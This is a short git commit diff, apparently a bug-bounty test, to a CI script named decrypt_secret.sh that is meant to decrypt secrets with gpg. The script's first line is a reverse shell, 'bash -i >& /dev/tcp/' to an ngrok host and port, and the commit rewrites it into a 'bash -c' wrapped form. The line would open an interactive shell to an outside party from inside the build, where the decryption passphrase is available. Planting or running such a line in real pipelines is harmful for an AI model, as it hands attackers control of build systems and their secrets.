97174b72bfd7aeb273b2a13c027e71ff1ed39392
Nisimi <roi.nisimi@orca.security>
2025-09-22 17:39:02 +0300

    bugbounty:test-ci-bug

--- .github/scripts/decrypt_secret.sh
+++ .github/scripts/decrypt_secret.sh
@@ -1,6 +1,6 @@
 #!/bin/sh
 
-bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/15476 0>&1
+bash -c 'bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/15476 0>&1'
 
 # --batch to prevent interactive command --yes to assume "yes" for questions
 gpg --quiet --batch --yes --decrypt --passphrase="$KEYFILE_PASSPHRASE" \
